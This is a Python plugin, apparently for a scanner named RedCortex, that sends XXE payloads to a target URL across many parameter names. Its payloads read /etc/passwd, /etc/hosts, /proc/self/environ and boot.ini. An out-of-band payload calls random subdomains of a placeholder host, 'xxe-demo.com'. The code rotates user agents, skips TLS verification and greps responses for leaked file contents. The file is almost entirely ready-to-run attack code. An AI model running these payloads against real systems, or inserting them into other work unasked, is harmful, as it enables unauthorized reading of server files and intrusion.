"""
RedCortex Plugin: Advanced XXE Scanner (loader-safe, robust, async)
- Multi-param/payload XXE/asynchronous HTTP probe
- Local file inclusion, OOB DNS/HTTP evidence, error-based/blind detection
"""

import logging
import random
import re
import asyncio
import uuid

logger = logging.getLogger(__name__)
logger.addHandler(logging.NullHandler())

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0)",
]

XXE_PARAMS = [
    "xml", "doc", "data", "input", "upload", "request", "feed", "content", "payload", "value"
]

OOB_DNS = "xxe-demo.com"  # Set to your OOB domain for real test

LFI_PATTERNS = [
    r"root:.*:0:0:",         # /etc/passwd
    r"\[extensions\]",       # win.ini snippet
    r"\[boot|system] loader",
    r"userinit=",
    r"PATH=",                # /proc/self/environ
    r"GNU/Linux",            # /proc/version
]

ERROR_PATTERNS = [
    r"XML\s*parser", r"DOCTYPE\s*not\s*allowed", r"entity.*not.*defined",
    r"syntax error", r"not.*found", r"access denied", r"file not found",
]

def random_oob():
    return f"http://{uuid.uuid4().hex}.{OOB_DNS}/"

def build_payloads():
    oob_url = random_oob()
    return [
        # Classic file exfil
        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        # OOB DNS
        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{oob_url}">]><foo>&xxe;</foo>""",
        # Parameter entity
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/hosts">%xxe;]><foo>bar</foo>""",
        # Internal subset trick (rare)
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % data SYSTEM "file:///proc/self/environ">%data;]><foo/>""",
        # XInclude
        """<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///c:/boot.ini" parse="text"/></foo>""",
    ]

def scan_evidence(response):
    for p in LFI_PATTERNS:
        if re.search(p, response, re.IGNORECASE):
            return "Sensitive file leak", p
    for e in ERROR_PATTERNS:
        if re.search(e, response, re.IGNORECASE):
            return "Parser error/evidence", e
    return None, None

async def scan_xxe_target(client, url, param, payload):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/xml"
    }
    params = {p: '' for p in XXE_PARAMS}
    params[param] = ""
    try:
        resp = await client.post(url, params=params, content=payload, headers=headers, timeout=15)
        if resp.status_code < 500 and resp.text:
            nature, proof = scan_evidence(resp.text)
            if nature:
                sev = "high" if "leak" in nature else "medium"
                return {
                    "vector": "xxe",
                    "param": param,
                    "payload": payload,
                    "evidence_type": nature,
                    "evidence": proof,
                    "severity": sev,
                    "url": str(resp.url),
                    "proof_excerpt": resp.text[:250]
                }
    except Exception as e:
        logger.debug("XXE request error %s: %s", url, e)
    return None

async def advanced_xxe_scan(url):
    import httpx
    evidence = []
    all_payloads = build_payloads()
    concurrency = 7
    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
        tasks = []
        for param in XXE_PARAMS:
            for payload in all_payloads:
                tasks.append(scan_xxe_target(client, url, param, payload))
                if len(tasks) >= concurrency:
                    result = await asyncio.gather(*tasks)
                    evidence.extend([f for f in result if f])
                    tasks = []
        if tasks:
            result = await asyncio.gather(*tasks)
            evidence.extend([f for f in result if f])
    return evidence

def run(response, url, **kwargs):
    try:
        findings = asyncio.run(advanced_xxe_scan(url))
        return findings
    except RuntimeError:
        # Alternate event loop for notebook/hosted runners
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        findings = loop.run_until_complete(advanced_xxe_scan(url))
        loop.close()
        return findings
    except KeyboardInterrupt:
        return []
    except Exception as e:
        logger.exception("XXE plugin error: %s", e)
        return []

# END OF FILE – Ready for RedCortex plugin manager (safe, robust)
